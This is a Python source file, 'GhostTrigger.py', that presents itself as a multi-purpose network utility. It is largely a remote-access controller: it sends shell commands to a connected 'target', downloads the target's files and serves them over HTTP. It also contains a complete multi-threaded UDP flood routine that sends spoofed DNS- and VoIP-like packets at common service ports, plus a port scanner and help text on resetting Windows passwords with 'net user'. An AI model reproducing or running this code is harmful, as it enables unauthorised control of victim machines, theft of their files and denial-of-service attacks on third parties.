#!/usr/bin/python
#-*-coding:utf8;-*-

"""
GhostTrigger.py

A multi-purpose network utility tool with features such as:
- Remote command execution (Netcat-like)
- File download and transfer
- Simple HTTP server for file sharing
- UDP flood (DoS testing)
- Port scanning
- Output saving and command help

Usage:
    python GhostTrigger.py [options]

Options:
    -h, --help, help         Show help message and usage.
    -d, --download <url>     Download a file from the given URL.
    -s, --port-scan <host>   Scan the given host for open ports.
    -l, --listen [port]      Listen for incoming connections (default port 55555).
    --udp-flood              (Disabled) UDP flood attack (for testing).
    -ss, --server <path>     Run a simple HTTP server in the given directory.

Interactive commands (when listening):
    l-host <cmd>             Execute a command on the local host.
    download <file>          Download a file from the remote host.
    server <IP:PORT>         Start a server on the remote host.
    target-ip                Show the target's IP address.
    output_save True|False   Enable/disable saving command output to file.
    help                     Show help message.

Author: (Unknown)
"""

from urllib.request import urlretrieve
import socketserver
import http.server
import subprocess
import threading
import argparse
import random
import socket
import tqdm
import time
import sys
import os

# Terminal color codes for output formatting
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def clear():
    """Clear the terminal screen."""
    os.system("clear")


help = YELLOW + """\n\t\t-------------- Help ------------------\n
    Commands\t\tUse\t\t\t\tExample"""+END+GREEN+"""
    l-host\t\tlocal-host <command>\t\tl-host ls
    download\t\tdownload <file name>\t\tdownload music.mp4
    server\t\tserver <IP:PORT>   \t\tserver 127.0.0.1:468
    target-ip\t\ttarget-ip             \t\tit shows the target ip
    output_save\t\toutput_save <True|False>\toutput_seve True or output_save False

    help\t\tit shows this help message

    if you on windows you can reset the password by typing as follows
    net user <user name> <new password> example: net user omer password123

    For more information type the name of the command follow by -h or --help
    """ + END
def HELP():
    print("""
------------------------------------------help---------------------------------------------
[+] netcat-v1.5.py [Options]
[+] netcat-v1.5.py [[-h,--help,help] , [-d,--download] , [-s,--port-scan] , [-l,--listen] , [--udp-flood]]
[+] Options:
        -h,--help,help   : it print this help message
        -d.--download    : it used to download files from the given url
        -s,--port-scan   : it used to scan the given host for an open Port
        -l,--listen      : it used to liston for target to connect
        --udp-flood      : it used to attack the given host and other by providing the IP
""")


# Shared Data for Tracking
packet_counts = {}  
lock = threading.Lock()  
stop_event = threading.Event()  

def send_udp_flood(thread_id, ports,TARGET_IP,PACKET_SIZE,FAKE_HEADERS,BASE_DELAY,ADAPTIVE_THRESHOLD,MIN_DELAY,MAX_DELAY):
    """UDP flood function for each thread."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    delay = BASE_DELAY  
    packet_count = 0  

    while not stop_event.is_set():  # Stop when the event is set
        for target_port in ports:  # Loop through all ports
            if stop_event.is_set():  
                break  # Stop immediately if the stop event is triggered

            message = random.choice(FAKE_HEADERS) + random._urandom(PACKET_SIZE - len(FAKE_HEADERS[0]))  

            try:
                sock.sendto(message, (TARGET_IP, target_port))
                packet_count += 1
            except Exception as e:
                print(f"[Thread {thread_id}] Error: {e}")
                break  

            # Update shared packet count
            with lock:
                packet_counts[thread_id] = packet_count  

            # Adaptive Rate Control
            if packet_count % ADAPTIVE_THRESHOLD == 0:
                delay = max(MIN_DELAY, min(MAX_DELAY, delay * random.uniform(0.8, 1.2)))  

            time.sleep(delay)  


# Command Interface
def command_interface(threads):
    while True:
        cmd = input("\nEnter command (status / stop): ").strip().lower()
        
        if cmd == "status":
            with lock:
                print("\n[Thread Status]")
                for tid, count in packet_counts.items():
                    print(f"Thread {tid}: {count} packets sent")
        
        elif cmd == "stop":
            print("\nStopping all threads...")
            stop_event.set()  
            for t in threads:
                t.join()  
            print("All threads stopped. Exiting.")
            break

# udp-flood(socket)
def udpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
    # deffult port
    ports = [
        21, # FTP
        22, # SSH
        23, # Telnet
        25, # SMTP
        53, # DNS(UDP)
        80, # HTTP
        110, # POP3
        123, # NTP(UDP)
        143, # IMAMP
        161, # SNMP(UDP)
        443, # HTTPS
        445, # SMB
        993, # IMAPS
        995, # POP3S
        3389, # RDP
        5060, # SIP(VoIP)
        8080, # Alternative HTTP
    ]

    # Adaptive Rate Control
    BASE_DELAY = 0.01  
    ADAPTIVE_THRESHOLD = 100  
    MIN_DELAY, MAX_DELAY = 0.05, 0.1  
    # Spoofed Protocol Data (Mimicking DNS/VoIP)
    FAKE_HEADERS = [
            b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00",  # DNS-like query
            b"\x80\x00\x00\x00\x00\x01\x00\x00\x00\x00",  # VoIP RTP header
            b"\x00\x00\x00\x00\x00\x00\x00\x00",  # Generic header
        ]
    # Start Threads
    threads = []
    for i in range(THREAD_COUNT):  
        t = threading.Thread(target=send_udp_flood, args=(i, ports,TARGET_IP,PACKET_SIZE,FAKE_HEADERS,BASE_DELAY,ADAPTIVE_THRESHOLD,MIN_DELAY,MAX_DELAY), daemon=True)
        t.start()
        threads.append(t)
        packet_counts[i] = 0
    command_interface(threads)



def run_server(dir_name):
    try:
        os.chdir(dir_name)
        IP   = socket.gethostname()
        PORT = 8080
        #creating request handler with variable name handler
        handler = http.server.SimpleHTTPRequestHandler
        #binding the request with the ip and port as httpd
        with socketserver.TCPServer((IP, int(PORT)), handler) as httpd:
            messeage = YELLOW+"[+] Server started at  -> "+IP+":"+str(PORT)+END
            print(messeage)
            #running the server
            httpd.serve_forever()
    except Exception as e:
        print(e)

def download(url):
    try:
        _save_as = input("[+] Enter file name to save it as: ")
        if _save_as == "" or _save_as == " "*len(_save_as):
            print("[!] Please provid a file name!!")
        else:
            #os.system("clear")
            urlretrieve(url,_save_as)
    except Exception as e:
        print(e)

def port_scan(_host):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    for port in range(1,100):
        try:
            s.connect((host,port))
            print(f"[+] Found open port at {_host}:{port}")
        except:
            print(f"[-] port is close {port}")

def emo():
    emots = ["☆","♤",
             "♡","◇",
             "♧","¤",
             "@","■"
            ]
    emot  = random.choice(emots)
    return emot

def Help(com):

    if com == "l-host":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("l-host      \t\tl-host <command> : Executing command on localhost or current hosting machine")
        print("""
l-host <commands>     : used to execute command on the local-host
                        example : l-host pwd
                                  l-host ls""")

    elif com == "download":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("download\t\tsend <file name> : download file to the host")
        print(""""
download <file_name>  : used to download file,mid,app and other from the target
                         example : download video.mp4
                                   download music.mp3
                                   download dir_name2/dir_name2/music.mp3""")

    elif com == "server":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("server      \t\tserver <IP:PORT> ")
        print("""
server <host:port>    : used to run http server on the target to access target file throughout browser
                     example  : server 127.0.0.1:55555
                     note that: it only recommend on the same network""")

    elif com[:9] == "target-ip":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("target-ip\t\ttarget_ip")
        print("""
target-ip <optional_command>: used to return the target ip
                    example : target-ip
                              target-ip help : help is the only optional command available""")
    elif com == "output_save":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("output_save\t\toutput_save <True|False>")
        print("""
output_save <True|False>    : used to save the received output command to default file name or
                              you can just changed the file name
                    example : output_seve True  : start saving
                              output_seve False : stop saving""")
    else:
        print(help)

def LocalHost(com):
    print(YELLOW+"\n\n\n"+"-"*50+END)
    print(GREEN+"[.......BEGINNING EXECUTING COMMAND ON LOCALHOST.......]"+END)
    print(YELLOW, "-"*50,END, "\n")

    if com[:2] == "cd":
        try:
            os.chdir(com[3:])
        except Exception as e:
            print(e)

    elif com[:2] == "ls":
        com = ("ls --color" + com[3:])
        os.system(com)

    else:
        os.system(com)
    print(YELLOW+"\n"+"-"*50+END)
    print(GREEN+"[...................END OF EXECUTING...................]"+END)
    print(YELLOW,"-"*50,END, "\n\n\n")

def recive(c,_port):

    print(_port)

    mp = 131537871
    _s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print(MAGENTA+"[+] START_DAWNLOADING..."+END)

    try:
        _s.bind((host,_port))
        _s.listen(5)
        (_conn,_addr) = _s.accept()
    except:
        pass
    file_size = int(_conn.recv(1024).decode("utf-8"))
    _size = (125.44*file_size)/mp
    print("file name: ",c,"file size: ",_size,"MB")
    with open(c,"wb") as file:
        #The time when the data start recving
        start_time = time.time()
        progress = tqdm.tqdm(unit="B", unit_scale=True, unit_divisor=1024,total=file_size)
        while True:
            data = _conn.recv(1024)
            if not(data):
                progress.update(1024)
                #time.sleep(1)
                break
            progress.update(1024)
            file.write(data)

            #The time when the data stop recving
        progress.update(1024)
        end_time = time.time()
        print("\nFile dwonload successfully in ",float(end_time - start_time),"seconds")
        _conn.close()
        _s.close()

import socket
import os

def main(port, _port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    save_to_file = False
    default_fname = "save_out_put.txt"

    try:
        s.bind((host, port))
        print(f"{GREEN}[WAITING FOR THE CONNECTION...]{END}")
        s.listen(5)
        conn, addr = s.accept()
        pwd = conn.recv(1024).decode("utf-8")
        clear()
    except Exception as e:
        print(f"{RED}[!][!] {e}{END}")
        exit()
    except KeyboardInterrupt:
        clear()
        print(f"{RED}[KEYBOARD INTERRUPT Ctrl + C] Wait...{END}")
        try:
            input(f"[Press_Enter_To_Exit...]{END}")
        except KeyboardInterrupt:
            print(f"{YELLOW}[-] You can't escape this reality{END}")
        s.close()
        exit()

    while True:
        try:
            emot = emo()
            com = input(
                f"{BLUE}<●{END}{GREEN}[{END}{YELLOW}Net-Cat{END}{GREEN}]{END}"
                f"{BLUE}{emot}{END}{GREEN}[{END}{MAGENTA}{pwd}{END}{GREEN}]{END}"
                f"{BLUE}> {END}{GREEN}\n\t   └─$ "
            )

            # download
            if com.startswith("download"):
                if len(com) == 8:
                    print(f"{GREEN}[+] Try: {com} -h or --help{END}")
                elif com[9:] in ("-h", "--help"):
                    Help("download")
                else:
                    conn.send(com.encode())
                    recive(com[9:], _port)

            # l-host
            elif com.startswith("l-host"):
                if len(com) == 6:
                    print(f"{GREEN}[+] Try: {com} -h or --help{END}")
                elif com[7:] in ("-h", "--help"):
                    Help("l-host")
                else:
                    LocalHost(com[7:])

            # target-ip
            elif com.startswith("target-ip"):
                if len(com) == 9:
                    print(f"{GREEN}[+] [TARGET]{END} {YELLOW}target ip = {addr[0]}{END}")
                elif com[10:] in ("help", "-h", "--help"):
                    Help("target-ip")
                else:
                    print(f"{RED}[!] Invalid command!{END}")
                    print(f"{GREEN}[Try] : target-ip help, -h or --help{END}")

            # output_save
            elif com.startswith("output_save"):
                if len(com) == 11:
                    print(f"{GREEN}[+] Try: {com} -h or --help{END}")
                elif com[12:] in ("-h", "--help"):
                    Help("output_save")
                elif com[12:].lower() == "true":
                    save_to_file = True
                    new_fname = input(f"[+] Enter file name {YELLOW}(Default: {default_fname}): {END}")
                    if new_fname.strip():
                        default_fname = new_fname.strip()
                    else:
                        print(f"{YELLOW}[+] Please enter a valid name{END}")
                        save_to_file = False
                elif com[12:].lower() == "false":
                    save_to_file = False

            # help
            elif com == "help":
                Help(com)

            # server
            elif com.startswith("server"):
                if len(com) == 6:
                    print(f"{GREEN}[+] Try: {com} -h or --help{END}")
                elif com[7:] in ("-h", "--help"):
                    Help("server")
                elif ":" in com:
                    conn.send(com.encode())
                else:
                    print(f"{RED}Invalid address!{END}")

            # general commands
            else:
                if not com.strip():
                    com = "echo '[!][!] cannot execute empty commands :p'"
                conn.send(com.encode())

                if com in ("exit", "quit"):
                    try:
                        input(f"{RED}[Press_Enter_To_Exit...]{END}")
                        print(f"{MAGENTA}[EXITING... Goodbye...]{END}")
                        break
                    except KeyboardInterrupt:
                        print(f"{YELLOW}[-] You can't escape this reality{END}")
                        break

                m = conn.recv(999999999).decode("utf-8")
                if "-pwd@-" in m:
                    pwd = m[6:]
                    m = f"{GREEN}[+] Successfully moved to: {pwd}{END}"
                print(m)

                if save_to_file:
                    with open("input.txt", "w") as f0:
                        f0.write(m)
                    with open("input.txt", "r") as f_in, open(default_fname, "a") as f_out:
                        f_out.write(f"<● [Netcat]-[{pwd}]>{com}\n")
                        for line in f_in:
                            clean_line = line.strip()
                            if "." in clean_line:
                                if "[" in clean_line:
                                    f_out.write(f"\t\t{clean_line[7:-4]}[directory]\n")
                                else:
                                    f_out.write(f"\t\t{clean_line}\n")
                            else:
                                if "[" in clean_line:
                                    f_out.write(f"\t\t/{clean_line[7:-4]}[directory]\n")
                                else:
                                    f_out.write(f"\t\t/{clean_line}\n")
                    os.remove("input.txt")

        except Exception as e:
            print(e)

        except KeyboardInterrupt:
            clear()
            print(f"{RED}[KEYBOARD INTERRUPT Ctrl + C] Wait...{END}")
            try:
                input(f"{MAGENTA}[Press_Enter_To_Continue...]{END}")
                clear()
            except KeyboardInterrupt:
                print(f"{YELLOW}[-] You can't escape this reality{END}")

    conn.close()
    s.close()


if __name__ == "__main__":

    host = ""
    port = 55555

    try:
        cmd = sys.argv[1] if len(sys.argv) > 1 else None

        if cmd in ("-h", "--help", "help"):
            HELP()

        elif cmd in ("--download", "-d"):
            try:
                url = sys.argv[2].strip()
                if not url:
                    print("[!] Please enter a valid URL.")
                    print("[+] Try: -d https://example.com/file.pdf or --download https://example.com/file.pdf")
                else:
                    download(url)
            except IndexError:
                print("[+] Missing URL.")
                print("[+] Try: -d https://example.com/file.pdf or --download https://example.com/file.pdf")

        elif cmd in ("--port-scan", "-s"):
            try:
                target = sys.argv[2]
                port_scan(target)
            except IndexError:
                print("[+] Missing target IP.")
                print("[+] Try: -s 127.0.0.1 or --port-scan 127.0.0.1")

        elif cmd == "--udp-flood":
            try:
                print("Out of business.")
            except Exception as e:
                print("[+] Try: --udp-flood <host1,host2,...>")
                print("[+] Example: --udp-flood 127.0.0.1,8.8.8.8", e)

        elif cmd in ("--listen", "-l"):
            print("[+] Listening mode activated.")
            try:
                port = int(sys.argv[2])
            except (IndexError, ValueError):
                pass  # use default port
            _port = port - 1
            print(f"[+] Listening on port {port}")
            main(port, _port)

        elif cmd in ("--server", "-ss"):
            try:
                path = sys.argv[2]
                run_server(path)
            except IndexError:
                print("[+] Missing folder path.")
                print("[+] Try: -ss folder/subfolder or --server folder/subfolder")

        else:
            if cmd:
                print(f"[!] Unknown command: {cmd}")
                HELP()
            else:
                HELP()

    except Exception as e:
        print(f"[!] Error: {e}")
        HELP()

